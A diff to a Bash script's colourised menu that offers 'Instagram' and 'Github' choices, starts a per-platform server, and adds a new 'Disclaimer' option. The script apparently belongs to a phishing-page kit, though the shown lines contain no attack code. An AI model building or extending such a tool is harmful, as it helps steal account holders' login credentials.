@@ -5,7 +5,7 @@ menu() {
   printf "\n"
   printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m   \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m\n"
   printf "\n"
-  printf "\e[1;92m[\e[0m\e[1;77m98\e[0m\e[1;92m]\e[0m\e[1;93mCredits  \e[0m\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93mExit\e[0m\n"
+  printf "\e[1;92m[\e[0m\e[1;77m97\e[0m\e[1;92m]\e[0m\e[1;93mDisclaimer  \e[0m\e[1;92m[\e[0m\e[1;77m98\e[0m\e[1;92m]\e[0m\e[1;93mCredits  \e[0m\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93mExit\e[0m\n"
 
   read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
@@ -17,6 +17,13 @@ menu() {
     server="github"
     startServer
 
+  elif [[ $option == 97 ]]; then
+    disclaimer
+    sleep 5
+    clear
+    banner
+    menu
+
   elif [[ $option == 98 ]]; then
     printf "\e[1;93m [!] SullFurix (@sullfurix)\e[0m\n"
     sleep 3
@@ -25,6 +32,7 @@ menu() {
     menu
 
   elif [[ $option == 99 ]]; then
+    clear
     exit 1
 
   else
